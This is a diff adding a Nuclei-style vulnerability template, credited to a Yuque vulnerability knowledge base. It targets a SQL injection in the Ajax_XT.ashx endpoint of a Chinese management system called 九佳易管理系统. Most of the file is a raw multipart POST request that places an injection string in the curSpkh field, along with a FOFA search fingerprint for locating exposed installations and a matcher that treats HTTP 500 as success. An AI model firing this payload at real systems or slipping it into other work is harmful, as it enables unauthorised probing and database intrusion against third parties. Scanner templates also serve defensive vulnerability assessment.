@@ -1,0 +1,47 @@
+id: poc-hy5kzoye7bgst9f6
+info:
+  name: 九佳易管理系统 Ajax_XT.ashx SQL 存在注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hy5kzoye7bgst9f6'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hy5kzoye7bgst9f6
+    fofa: body="/XiTong/Index/W_IndexPbForm.win.js"
+http:
+- raw:
+  - 'POST /Service/Ajax_XT.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="curFlag"
+
+
+    PicSord
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="curPxbh"
+
+
+    1,2
+
+    ------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="curSpkh"
+
+
+    ''-1/user--
+
+    ------WebKitFormBoundary--'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
